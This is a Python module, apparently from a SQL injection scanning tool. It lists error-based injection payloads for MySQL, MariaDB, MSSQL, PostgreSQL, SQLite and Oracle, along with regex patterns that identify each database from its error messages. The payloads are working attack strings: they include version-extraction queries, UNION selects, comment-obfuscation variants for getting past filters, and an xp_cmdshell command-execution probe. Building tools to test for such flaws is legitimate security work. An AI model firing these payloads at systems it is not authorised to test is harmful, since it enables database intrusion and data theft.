# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Error-based payloads and DB error patterns.
"""
from __future__ import annotations

from typing import List

# ---------------------------------------------------------------------------
# Error-based payloads
# Keys: "generic", "mysql", "mariadb", "mssql", "postgres", "sqlite", "oracle"
# ---------------------------------------------------------------------------

ERROR_PAYLOADS: dict[str, List[str]] = {
    "generic": [
        "'",
        '"',
        "';",
        '";',
        "'-- -",
        '"-- -',
        "'#",
        # Paren-escape variants: covers WHERE x=('val') and LIKE ('%val%') contexts
        "')-- -",
        "'))-- -",
        "') --",
        "')) --",
        "' OR '1'='1",
        "' OR 1=1-- -",
        "' AND 1=CONVERT(int,'a')-- -",
        "1'",
        "1\"",
        "1`",
        "\\",
        "' AND EXTRACTVALUE(1,0x0a)-- -",
        "'--/**/-",
        "/^.*1'--+-.*$/",
        "/*!500001'--+-*/",
        "'--/*--*/-",
        "'--/*&a=*/-",
        "'--/*1337*/-",
        "'--/**_**/-",
        "'--%0A-",
        "'--%0b-",
        "'--%0d%0A-",
        "'--%23%0A-",
        "'--%23foo%0D%0A-",
        "'--%23foo*%2F*bar%0D%0A-",
        "'--#qa%0A#%0A-",
        "/*!20000%0d%0a1'--+-*/",
    ],
    "mysql": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))-- -",
        "1 AND EXP(~(SELECT * FROM(SELECT VERSION())a))-- -",
    ],
    "mariadb": [
        # MariaDB shares most MySQL error payloads but has a few unique functions
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' AND JSON_VALUE('{\"a\":1}','$.b')-- -",
    ],
    "mssql": [
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
        "'; WAITFOR DELAY '0:0:0'-- -",    # safe probe, delay=0
        "' AND 1=1/0-- -",
        "' HAVING 1=1-- -",
        "' GROUP BY columnnames HAVING 1=1-- -",
        "'; EXEC xp_cmdshell('echo test')-- -",   # risk>=3 only — filtered in active.py
    ],
    "postgres": [
        "' AND 1=CAST((SELECT version()) AS int)-- -",
        "' AND 1=(SELECT 1 FROM pg_sleep(0))-- -",   # safe, delay=0
        "'; SELECT pg_sleep(0)-- -",
        "' UNION SELECT NULL,NULL,version()-- -",
        "' AND 1=1::integer-- -",
    ],
    "sqlite": [
        "' AND 1=CAST(sqlite_version() AS INTEGER)-- -",
        "' AND typeof(1)='integer'-- -",
        "' UNION SELECT sqlite_version(),NULL-- -",
        "' AND randomblob(1)-- -",
        "1' AND '1'='1",
        # Paren-escape variants for SQLite LIKE contexts
        "') AND 1=CAST(sqlite_version() AS INTEGER)-- -",
        "')) AND 1=CAST(sqlite_version() AS INTEGER)-- -",
    ],
    "oracle": [
        "' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS INTEGER)-- -",
        "' AND 1=(SELECT 1 FROM dual WHERE 1=1)-- -",
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('invalid')-- -",
        "' UNION SELECT NULL,NULL FROM dual-- -",
        "' AND ROWNUM=1-- -",
        "1 AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS INTEGER)-- -",
    ],
}

# DB error signatures — used to detect which DBMS is present and confirm error-based SQLi
DB_ERROR_PATTERNS: dict[str, List[str]] = {
    "mysql": [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"supplied argument is not a valid mysql",
        r"unclosed quotation mark",
        r"extractvalue\(",
        r"updatexml\(",
        r"unknown column",
        r"42s22",
        r"42000",
        r"\b1054\b",
        r"\b1064\b",
        r"different number of columns",
        r"21000",
    ],
    "mariadb": [
        r"mariadb.*error",
        r"you have an error in your sql syntax",
        r"warning: mariadb",
    ],
    "mssql": [
        r"microsoft sql server",
        r"incorrect syntax near",
        r"unclosed quotation mark after the character string",
        r"syntax error converting",
        r"mssql_query\(\)",
        r"odbc sql server driver",
        r"\[microsoft\]\[odbc",
    ],
    "postgres": [
        r"postgresql.*error",
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"psql.*error",
        r"invalid input syntax for",
        r"unterminated quoted string at or near",
        r"syntax error at or near",
        r"division by zero",
        r"order by term out of range",
        r"position \d+ is not in select list",
    ],
    "sqlite": [
        r"sqlite.*error",
        r"sqlite3\.",
        r"sqlite_step\(\)",
        r"near \".*\": syntax error",
        r"unrecognized token",
        r"order by term out of range",
        r"no such column",
        r"ambiguous column name",
    ],
    "oracle": [
        r"ora-\d{5}",
        r"oracle.*error",
        r"quoted string not properly terminated",
        r"pl/sql.*error",
        r"from dual",
        r"missing right parenthesis",
    ],
    "generic": [
        r"sql syntax",
        r"sql error",
        r"syntax error",
        r"quoted string not properly terminated",
        r"microsoft ole db",
        r"error in your sql",
        r"unexpected end of sql command",
    ],
}


def get_error_payloads(dbms: str, risk: int) -> List[str]:
    """Return error-based payloads for *dbms* filtered by *risk* level."""
    generic = ERROR_PAYLOADS["generic"]
    specific = ERROR_PAYLOADS.get(dbms, []) if dbms != "auto" else []
    payloads = generic + specific
    # MSSQL xp_cmdshell only at risk 3
    if risk < 3:
        payloads = [p for p in payloads if "xp_cmdshell" not in p.lower()]
    return payloads
